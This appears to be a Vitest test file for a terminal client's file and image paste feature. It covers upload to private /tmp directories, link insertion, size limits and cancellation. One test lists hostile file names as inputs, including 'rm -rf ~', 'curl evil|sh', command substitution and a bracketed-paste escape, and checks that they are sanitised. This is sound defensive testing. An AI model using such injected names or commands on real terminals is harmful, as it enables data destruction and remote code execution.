/** @vitest-environment jsdom */

import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { act, createElement } from "react";
import { flush, flushMacrotask, mount, waitForRendered, type MountedView } from "./reactTestUtils";

const mocks = vi.hoisted(() => {
  return {
    flags: { web: false },
    listLive: vi.fn(),
    ask: vi.fn(),
    pickSavePath: vi.fn(),
    fsWrite: vi.fn(),
    fsMkdirPrivate: vi.fn(),
    fsDelete: vi.fn(),
    fsRoots: vi.fn(),
    fsCancel: vi.fn(),
    uploadChunked: vi.fn(),
    paste: vi.fn(),
    assetGet: vi.fn(),
    sessionList: vi.fn(),
  };
});

vi.mock("../../app/platform", () => ({
  isMac: () => false,
  modHint: () => "Ctrl",
  setMacPlatform: () => {},
  wailsDragRegionStyle: {},
  wailsNoDragRegionStyle: {},
  isWailsDragRegionTarget: () => false,
}));

vi.mock("../../ipc/commands", () => ({
  assetApi: { get: mocks.assetGet },
  dbApi: {},
  vaultApi: {},
  sessionApi: {
    probeHostKey: vi.fn().mockResolvedValue({ state: "known" }),
    list: mocks.sessionList,
  },
  terminalApi: {
    listLive: mocks.listLive,
    write: vi.fn().mockResolvedValue(undefined),
    detach: vi.fn().mockResolvedValue(undefined),
    setVisible: vi.fn().mockResolvedValue(undefined),
  },
  fsApi: {
    write: mocks.fsWrite,
    mkdirPrivate: mocks.fsMkdirPrivate,
    delete: mocks.fsDelete,
    roots: mocks.fsRoots,
    cancel: mocks.fsCancel,
  },
}));

vi.mock("../../features/files/chunkedUpload", async (importOriginal) => ({
  ...(await importOriginal<typeof import("../../features/files/chunkedUpload")>()),
  uploadChunked: mocks.uploadChunked,
}));

vi.mock("../../ipc/events", () => ({
  listenEvent: vi.fn().mockResolvedValue(() => {}),
  EVENTS: { terminalControl: "terminal-control" },
  EventVersionGate: class {
    accept() {
      return true;
    }
  },
}));

vi.mock("../../ipc/env", () => ({
  clientId: () => "me",
  get WEB() {
    return mocks.flags.web;
  },
}));

vi.mock("../../ui/dialogs", () => ({
  describeTarget: () => "",
  finishSave: vi.fn(),
  pickSavePath: mocks.pickSavePath,
  promptText: vi.fn(),
  ask: mocks.ask,
}));

vi.mock("../../features/terminal/CommandBlockPanel", () => ({ CommandBlockPanel: () => null }));
vi.mock("../../features/terminal/TerminalKeysBar", () => ({ TerminalKeysBar: () => null }));

const harness = vi.hoisted(() => ({
  props: null as Record<string, unknown> | null,
}));

vi.mock("../../features/terminal/XtermView", async () => {
  const { useEffect, useRef } = await import("react");
  return {
    XtermView: (props: Record<string, unknown>) => {
      harness.props = props;
      const onHandleRef = useRef(props.onHandle);
      const onAttachRef = useRef(props.onAttach);
      onHandleRef.current = props.onHandle;
      onAttachRef.current = props.onAttach;
      useEffect(() => {
        (onHandleRef.current as ((handle: unknown) => void) | undefined)?.({
          copyBlock: () => "",
          scrollToBlock: () => {},
          navigateBlock: () => null,
          clearBlocks: () => {},
          clear: () => {},
          getSelection: () => "",
          focus: () => {},
          fit: () => {},
          paste: mocks.paste,
          dimensions: () => ({ cols: 80, rows: 24 }),
        });
        (onAttachRef.current as ((id: string) => void) | undefined)?.("kernel-1");
      }, []);
      return <div data-testid="xterm-mock" />;
    },
  };
});

import { TerminalPane } from "../../features/terminal/TerminalPane";
import { useUi, type AppTab } from "../../app/store";

let mounted: MountedView | undefined;

function seedTab(kind: "ssh" | "winrm" | "docker" = "ssh") {
  const tab: AppTab = {
    id: "t1",
    kind: "terminal",
    title: "web-01",
    sessionId: "s1",
    tabId: "kernel-1",
    closable: true,
  };
  useUi.setState({
    workspaces: [
      {
        id: "ws1",
        kind: "session",
        title: "web-01",
        sessionId: "s1",
        assetId: "asset-1",
        assetKind: "ssh",
        panes: [{ id: "p1", tabs: [tab], activeTabId: tab.id }],
        activePaneId: "p1",
        closable: true,
      },
    ],
    activeWorkspaceId: "ws1",
    sessions: [
      {
        id: "s1",
        assetId: "asset-1",
        name: "web-01",
        kind,
        status: "connected",
        tabs: [],
        createdAt: 0,
      },
    ],
    toasts: [],
  });
}

function sized(name: string, size: number, type = "application/octet-stream"): File {
  const file = new File([new Uint8Array(Math.min(size, 8))], name, { type });
  Object.defineProperty(file, "size", { value: size });
  return file;
}

function mountPane(kind: "ssh" | "winrm" | "docker" = "ssh", extra: Record<string, unknown> = {}) {
  seedTab(kind);
  mounted = mount(
    createElement(TerminalPane, { sessionId: "s1", title: "web-01", storeTabId: "t1", resumeTabId: "kernel-1", ...extra }),
  );
}

const DIR = String.raw`/tmp/nexterm-paste-[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}`;
const dirPattern = new RegExp(`^${DIR}$`);
const inDir = (name: string) => new RegExp(`^${DIR}/${name}$`);

function resetFsMocks() {
  mocks.fsWrite.mockResolvedValue(undefined);
  mocks.fsMkdirPrivate.mockResolvedValue(undefined);
  mocks.fsDelete.mockResolvedValue(undefined);
  mocks.fsRoots.mockResolvedValue({ pathStyle: "posix", roots: [], homePath: null, supported: true });
  mocks.fsCancel.mockResolvedValue(true);
  mocks.uploadChunked.mockResolvedValue(undefined);
  mocks.assetGet.mockResolvedValue({ id: "asset-1", options: {} });
  mocks.sessionList.mockResolvedValue([]);
}

// The pane resyncs the session list on attach; keep the asset-backed session in it.
function keepAssetSession() {
  mocks.sessionList.mockImplementation(async () => [
    { id: "s1", assetId: "asset-1", name: "web-01", kind: "ssh", status: "connected", tabs: [], createdAt: 0 },
  ]);
}

function png(name: string): File {
  return new File([new Uint8Array([0x89, 0x50, 0x4e, 0x47])], name, { type: "image/png" });
}

async function pasteImages(files: File[], skipped: string[] = []): Promise<void> {
  await act(async () => {
    (harness.props?.onPasteFiles as ((files: File[], skipped: string[]) => void) | undefined)?.(files, skipped);
    await flushMacrotask();
  });
}

async function pasteFromMenu(): Promise<void> {
  const body = mounted?.container.querySelector<HTMLElement>(".nx-terminal-body .relative");
  if (!body) throw new Error("terminal body not found");
  act(() => {
    body.dispatchEvent(new MouseEvent("contextmenu", { bubbles: true, cancelable: true, clientX: 20, clientY: 20 }));
  });
  await flush();
  const item = [...document.querySelectorAll<HTMLElement>(".nx-menu .nx-menu-item")].find(
    (candidate) => candidate.textContent?.includes("粘贴图片"),
  );
  if (!item) throw new Error("paste image menu item not found");
  await act(async () => {
    item.dispatchEvent(new MouseEvent("click", { bubbles: true }));
  });
}

function statusText(): string {
  const close = mounted?.container.querySelector('[aria-label="关闭文件粘贴提示"]');
  return close?.parentElement?.textContent ?? "";
}

describe("TerminalPane image paste orchestration", () => {
  beforeEach(() => {
    vi.clearAllMocks();
    document.body.replaceChildren();
    harness.props = null;
    mocks.flags.web = false;
    mocks.listLive.mockResolvedValue([]);
    mocks.ask.mockResolvedValue(true);
    mocks.fsWrite.mockResolvedValue(undefined);
    resetFsMocks();
  });

  afterEach(() => {
    mounted?.unmount();
    mounted = undefined;
    vi.unstubAllGlobals();
  });

  it("writes through the file channel to /tmp on the current session host, inserts a plain Markdown link, and shows success", async () => {
    seedTab();
    mounted = mount(
      createElement(TerminalPane, {
        sessionId: "s1",
        title: "web-01",
        storeTabId: "t1",
        resumeTabId: "kernel-1",
      }),
    );
    await flush();

    await pasteImages([png("shot.png")]);

    await waitForRendered(() =>
      expect(mocks.paste).toHaveBeenCalledWith(expect.stringMatching(new RegExp(String.raw`^\[shot\.png\]\(${DIR}/shot\.png\)$`))),
    );
    expect(mocks.fsMkdirPrivate).toHaveBeenCalledWith("s1", expect.stringMatching(dirPattern));
    expect(mocks.fsWrite).toHaveBeenCalledTimes(1);
    expect(mocks.fsWrite).toHaveBeenCalledWith(
      "s1",
      expect.stringMatching(inDir(String.raw`shot\.png`)),
      "iVBORw==",
      false,
      expect.any(String),
      expect.any(String),
    );
    expect(statusText()).toContain("已上传 1 个文件");
    expect(mocks.ask).not.toHaveBeenCalled();
  });

  it("writes multiple images individually and joins their links with spaces in order", async () => {
    seedTab();
    mounted = mount(
      createElement(TerminalPane, {
        sessionId: "s1",
        title: "web-01",
        storeTabId: "t1",
        resumeTabId: "kernel-1",
      }),
    );
    await flush();

    await pasteImages([png("a.png"), png("b.png")]);

    await waitForRendered(() =>
      expect(mocks.paste).toHaveBeenCalledWith(
        expect.stringMatching(new RegExp(String.raw`^\[a\.png\]\(${DIR}/a\.png\) \[b\.png\]\(${DIR}/b\.png\)$`)),
      ),
    );
    expect(mocks.fsMkdirPrivate).toHaveBeenCalledTimes(1);
    expect(mocks.fsWrite).toHaveBeenCalledTimes(2);
    expect(mocks.fsWrite).toHaveBeenNthCalledWith(
      2,
      "s1",
      expect.stringMatching(inDir(String.raw`b\.png`)),
      "iVBORw==",
      false,
      expect.any(String),
      expect.any(String),
    );
    expect(statusText()).toContain("已上传 2 个文件");
  });

  it("shows the failure reason on upload failure and inserts nothing", async () => {
    seedTab();
    mocks.fsWrite.mockRejectedValue({ code: "internal", message: "磁盘只读" });
    mounted = mount(
      createElement(TerminalPane, {
        sessionId: "s1",
        title: "web-01",
        storeTabId: "t1",
        resumeTabId: "kernel-1",
      }),
    );
    await flush();

    await pasteImages([png("big.png")]);

    await waitForRendered(() => expect(statusText()).toContain("磁盘只读"));
    expect(statusText()).toContain("/tmp");
    expect(mocks.paste).not.toHaveBeenCalled();
    const dir = mocks.fsMkdirPrivate.mock.calls[0]?.[1] as string;
    expect(mocks.fsDelete).toHaveBeenCalledWith("s1", dir, true);
  });

  it.each(["NotAllowedError", "SecurityError"])("offers direct paste and drag when image clipboard reading fails with %s", async (name) => {
    seedTab();
    vi.stubGlobal("navigator", {
      clipboard: { read: vi.fn().mockRejectedValue(new DOMException("platform technical details", name)) },
    });
    mounted = mount(createElement(TerminalPane, {
      sessionId: "s1", title: "web-01", storeTabId: "t1", resumeTabId: "kernel-1",
    }));
    await flush();

    await pasteFromMenu();

    const toast = useUi.getState().toasts.at(-1);
    expect(toast?.kind).toBe("info");
    expect(toast?.text).toContain("Ctrl+V");
    expect(toast?.text).toContain("拖入");
    expect(toast?.text).not.toContain("platform technical details");
    expect(mocks.fsWrite).not.toHaveBeenCalled();
  });

  it("offers direct paste when the image clipboard API is unavailable", async () => {
    seedTab();
    vi.stubGlobal("navigator", { clipboard: undefined });
    mounted = mount(createElement(TerminalPane, {
      sessionId: "s1", title: "web-01", storeTabId: "t1", resumeTabId: "kernel-1",
    }));
    await flush();

    await pasteFromMenu();

    expect(useUi.getState().toasts.at(-1)?.text).toContain("当前环境不支持直接读取");
    expect(mocks.fsWrite).not.toHaveBeenCalled();
  });

  it("keeps unexpected clipboard read failures visible", async () => {
    seedTab();
    vi.stubGlobal("navigator", {
      clipboard: { read: vi.fn().mockRejectedValue(new Error("read failed")) },
    });
    mounted = mount(createElement(TerminalPane, {
      sessionId: "s1", title: "web-01", storeTabId: "t1", resumeTabId: "kernel-1",
    }));
    await flush();

    await pasteFromMenu();

    expect(useUi.getState().toasts.at(-1)?.text).toContain("读取剪贴板图片失败：read failed");
    expect(mocks.fsWrite).not.toHaveBeenCalled();
  });
});

describe("TerminalPane file paste orchestration", () => {
  beforeEach(() => {
    vi.clearAllMocks();
    document.body.replaceChildren();
    harness.props = null;
    mocks.flags.web = false;
    mocks.listLive.mockResolvedValue([]);
    mocks.fsWrite.mockResolvedValue(undefined);
    resetFsMocks();
  });

  afterEach(() => {
    mounted?.unmount();
    mounted = undefined;
  });

  it("uploads a non-image file into a per-paste directory under its own name and links it", async () => {
    mountPane();
    await flush();

    await pasteImages([new File(["hello"], "my report (v1).pdf", { type: "application/pdf" })]);

    await waitForRendered(() =>
      expect(mocks.paste).toHaveBeenCalledWith(
        expect.stringMatching(new RegExp(String.raw`^\[my report _v1_\.pdf\]\(<${DIR}/my report _v1_\.pdf>\)$`)),
      ),
    );
    expect(mocks.fsMkdirPrivate).toHaveBeenCalledWith("s1", expect.stringMatching(dirPattern));
    expect(mocks.fsWrite).toHaveBeenCalledWith(
      "s1",
      expect.stringMatching(inDir(String.raw`my report _v1_\.pdf`)),
      "aGVsbG8=",
      false,
      expect.any(String),
      expect.any(String),
    );
    expect(statusText()).toContain("已上传 1 个文件到这台主机的 /tmp 并插入链接");
  });

  it("handles mixed images and files, sanitising names and avoiding collisions", async () => {
    mountPane();
    await flush();

    await pasteImages([
      png("shot.png"),
      new File(["1"], "../a.txt"),
      new File(["2"], "../a.txt"),
      new File(["3"], ".env"),
    ]);

    await waitForRendered(() => expect(mocks.paste).toHaveBeenCalled());
    const text = mocks.paste.mock.calls[0]?.[0] as string;
    expect(text).toMatch(new RegExp(String.raw`\[shot\.png\]\(${DIR}/shot\.png\)`));
    const paths = mocks.fsWrite.mock.calls.map((c) => c[1] as string);
    expect(paths).toHaveLength(4);
    expect(new Set(paths).size).toBe(4);
    for (const path of paths) {
      expect(path).toMatch(inDir("[^/]+"));
    }
    expect(paths.some((p) => p.endsWith("/_a.txt"))).toBe(true);
    expect(paths.some((p) => p.endsWith("/_a-2.txt"))).toBe(true);
    expect(paths.some((p) => p.endsWith("/env"))).toBe(true);
    expect(mocks.fsMkdirPrivate).toHaveBeenCalledTimes(1);
    expect(statusText()).toContain("已上传 4 个文件");
  });

  it("uses the chunked upload for files larger than one chunk", async () => {
    mountPane();
    await flush();

    await pasteImages([sized("big.iso", 5 * 1024 * 1024)]);

    await waitForRendered(() => expect(mocks.uploadChunked).toHaveBeenCalledTimes(1));
    expect(mocks.uploadChunked.mock.calls[0]?.[0]).toMatchObject({
      sessionId: "s1",
      remotePath: expect.stringMatching(inDir(String.raw`big\.iso`)),
    });
    expect(mocks.fsWrite).not.toHaveBeenCalled();
    await waitForRendered(() => expect(mocks.paste).toHaveBeenCalled());
  });

  it("skips files over 20 MB with a visible message and still uploads the rest", async () => {
    mountPane();
    await flush();

    await pasteImages([sized("huge.bin", 20 * 1024 * 1024 + 1), new File(["ok"], "ok.txt")]);

    await waitForRendered(() => expect(mocks.paste).toHaveBeenCalledTimes(1));
    expect(mocks.paste.mock.calls[0]?.[0]).toContain("ok.txt");
    expect(mocks.paste.mock.calls[0]?.[0]).not.toContain("huge.bin");
    expect(statusText()).toContain("已跳过超过 20 MB 的文件：huge.bin");
    expect(useUi.getState().toasts.at(-1)?.text).toContain("huge.bin");
  });

  it("uploads a file of exactly 20 MB", async () => {
    mountPane();
    await flush();

    await pasteImages([sized("edge.bin", 20 * 1024 * 1024)]);

    await waitForRendered(() => expect(mocks.uploadChunked).toHaveBeenCalledTimes(1));
  });

  it("reports an error and uploads nothing when every file is too large", async () => {
    mountPane();
    await flush();

    await pasteImages([sized("huge.bin", 21 * 1024 * 1024)]);

    await waitForRendered(() => expect(statusText()).toContain("huge.bin"));
    expect(mocks.uploadChunked).not.toHaveBeenCalled();
    expect(mocks.fsWrite).not.toHaveBeenCalled();
    expect(mocks.paste).not.toHaveBeenCalled();
  });

  it.each(["winrm", "docker"] as const)("explains that %s sessions cannot take pasted files", async (kind) => {
    mountPane(kind);

    await pasteImages([new File(["x"], "a.txt")]);

    expect(useUi.getState().toasts.at(-1)?.text).toContain("不支持");
    expect(mocks.fsWrite).not.toHaveBeenCalled();
    expect(mocks.uploadChunked).not.toHaveBeenCalled();
    expect(mocks.paste).not.toHaveBeenCalled();
  });

  it.each([
    ["newline", "x\nrm -rf ~\n.txt"],
    ["carriage return", "x\rcurl evil|sh\r.txt"],
    ["bracketed-paste terminator", "x\u001b[201~whoami\n.txt"],
    ["bidi override", "invoice\u202Etxt.exe"],
    ["command substitution", "$(curl x|sh).txt"],
    ["backtick and semicolon", "`id`;rm.txt"],
  ])("inserts no control, format or shell metacharacters for a %s file name", async (_label, name) => {
    mountPane();
    await flush();

    await pasteImages([new File(["x"], name)]);

    await waitForRendered(() => expect(mocks.paste).toHaveBeenCalledTimes(1));
    const text = mocks.paste.mock.calls[0]?.[0] as string;
    expect(text).not.toMatch(/[\u0000-\u001f\u007f-\u009f\p{Cf}\u2028\u2029$`;|&*?'"!]/u);
    const path = mocks.fsWrite.mock.calls[0]?.[1] as string;
    expect(path).not.toMatch(/[\u0000-\u001f\u007f-\u009f\p{Cf}\u2028\u2029]/u);
    const stored = path.slice(path.lastIndexOf("/") + 1);
    expect(stored).toMatch(/^[\p{L}\p{N} ._+-]+$/u);
    expect(text.startsWith(`[${stored}](`)).toBe(true);
  });

  it("refuses to reuse the paste directory when private creation fails and writes nothing", async () => {
    mocks.fsMkdirPrivate.mockRejectedValue({ code: "conflict", message: "临时目录已存在，已拒绝复用" });
    mountPane();
    await flush();

    await pasteImages([new File(["x"], "a.txt")]);

    await waitForRendered(() => expect(statusText()).toContain("临时目录已存在"));
    expect(mocks.fsWrite).not.toHaveBeenCalled();
    expect(mocks.fsDelete).not.toHaveBeenCalled();
    expect(mocks.paste).not.toHaveBeenCalled();
  });

  it("uploads into the asset's configured directory and inserts the mapped terminal path", async () => {
    mocks.assetGet.mockResolvedValue({ id: "asset-1", options: { pasteUploadDir: "/", pasteTerminalDir: "/tmp" } });
    keepAssetSession();
    mountPane();
    await flush();

    await pasteImages([png("shot.png")]);

    await waitForRendered(() => expect(mocks.paste).toHaveBeenCalledTimes(1));
    expect(mocks.assetGet).toHaveBeenCalledWith("asset-1");
    const dir = mocks.fsMkdirPrivate.mock.calls[0]?.[1] as string;
    expect(dir).toMatch(/^\/nexterm-paste-[0-9a-f-]{36}$/);
    expect(mocks.fsWrite).toHaveBeenCalledWith("s1", `${dir}/shot.png`, "iVBORw==", false, expect.any(String), expect.any(String));
    expect(mocks.paste).toHaveBeenCalledWith(`[shot.png](/tmp${dir}/shot.png)`);
    expect(statusText()).toContain("这台主机的 /tmp 并插入链接");
  });

  it("names the configured directory when it is missing over SFTP and cleans nothing it did not create", async () => {
    mocks.assetGet.mockResolvedValue({ id: "asset-1", options: { pasteUploadDir: "/upload" } });
    mocks.fsMkdirPrivate.mockRejectedValue({ code: "not_found", message: "file does not exist" });
    keepAssetSession();
    mountPane();
    await flush();

    await pasteImages([png("shot.png")]);

    await waitForRendered(() => expect(statusText()).toContain("/upload"));
    expect(statusText()).toContain("粘贴上传目录");
    expect(mocks.fsDelete).not.toHaveBeenCalled();
    expect(mocks.paste).not.toHaveBeenCalled();
  });

  it("suggests the asset setting when the default /tmp is missing over SFTP", async () => {
    mocks.fsMkdirPrivate.mockRejectedValue({ code: "not_found", message: "file does not exist" });
    mountPane();
    await flush();

    await pasteImages([png("shot.png")]);

    await waitForRendered(() => expect(statusText()).toContain("文件面板"));
    expect(statusText()).toContain("资产高级选项");
  });

  it("refuses invalid stored directory options before creating anything", async () => {
    mocks.assetGet.mockResolvedValue({ id: "asset-1", options: { pasteUploadDir: "/a/../etc" } });
    keepAssetSession();
    mountPane();
    await flush();

    await pasteImages([png("shot.png")]);

    await waitForRendered(() => expect(statusText()).toContain("资产高级选项"));
    expect(mocks.fsMkdirPrivate).not.toHaveBeenCalled();
    expect(mocks.paste).not.toHaveBeenCalled();
  });

  it("uses a fresh unguessable directory for every paste", async () => {
    mountPane();
    await flush();

    await pasteImages([new File(["x"], "a.txt")]);
    await pasteImages([new File(["x"], "a.txt")]);

    await waitForRendered(() => expect(mocks.fsMkdirPrivate).toHaveBeenCalledTimes(2));
    expect(mocks.fsMkdirPrivate.mock.calls[0]?.[1]).not.toBe(mocks.fsMkdirPrivate.mock.calls[1]?.[1]);
  });

  it("blocks hosts with Windows paths before creating anything", async () => {
    mocks.fsRoots.mockResolvedValue({ pathStyle: "windows", roots: [], homePath: null, supported: true });
    mountPane();
    await flush();

    await pasteImages([new File(["x"], "a.txt")]);

    await waitForRendered(() => expect(statusText()).toContain("Windows"));
    expect(mocks.fsMkdirPrivate).not.toHaveBeenCalled();
    expect(mocks.fsWrite).not.toHaveBeenCalled();
  });

  it("treats a terminal forced into WinRM mode as unsupported", async () => {
    mountPane("ssh", { winrm: true });

    await pasteImages([new File(["x"], "a.txt")]);

    expect(useUi.getState().toasts.at(-1)?.text).toContain("不支持");
    expect(mocks.fsMkdirPrivate).not.toHaveBeenCalled();
  });

  it("reports skipped folders and unreadable entries next to the uploaded files", async () => {
    mountPane();
    await flush();

    await pasteImages([new File(["x"], "a.txt")], ["文件夹「src」", "无法读取的项目"]);

    await waitForRendered(() => expect(mocks.paste).toHaveBeenCalledTimes(1));
    expect(statusText()).toContain("文件夹「src」");
    expect(statusText()).toContain("无法读取的项目");
  });

  it("reports skipped entries when nothing else can be uploaded", async () => {
    mountPane();
    await flush();

    await pasteImages([], ["文件夹「src」"]);

    await waitForRendered(() => expect(statusText()).toContain("文件夹「src」"));
    expect(mocks.fsMkdirPrivate).not.toHaveBeenCalled();
  });

  it("shows aggregate progress across files and cancels the running transfer with cleanup", async () => {
    let release: (() => void) | undefined;
    mocks.uploadChunked.mockImplementation(
      (args: { onProgress?: (done: number, total: number) => void }) =>
        new Promise<void>((_resolve, reject) => {
          args.onProgress?.(2 * 1024 * 1024, 4 * 1024 * 1024);
          release = () => reject({ code: "cancelled", message: "文件传输已取消" });
        }),
    );
    mountPane();
    await flush();

    await pasteImages([sized("small.bin", 4 * 1024 * 1024), sized("big.bin", 4 * 1024 * 1024)]);

    await waitForRendered(() => expect(mocks.uploadChunked).toHaveBeenCalledTimes(1));
    await waitForRendered(() => expect(statusText()).toContain("25%"));
    const cancel = Array.from(mounted?.container.querySelectorAll("button") ?? []).find((b) => b.textContent === "取消");
    expect(cancel).toBeDefined();
    const transfer = mocks.uploadChunked.mock.calls[0]?.[0] as { taskId: string; attemptId: string };
    await act(async () => {
      cancel?.click();
      release?.();
      await flushMacrotask();
    });

    await waitForRendered(() => expect(statusText()).toContain("已取消上传"));
    expect(mocks.fsCancel).toHaveBeenCalledWith(transfer.taskId, transfer.attemptId);
    expect(mocks.fsDelete).toHaveBeenCalledWith("s1", mocks.fsMkdirPrivate.mock.calls[0]?.[1], true);
    expect(mocks.uploadChunked).toHaveBeenCalledTimes(1);
    expect(mocks.paste).not.toHaveBeenCalled();
  });
});
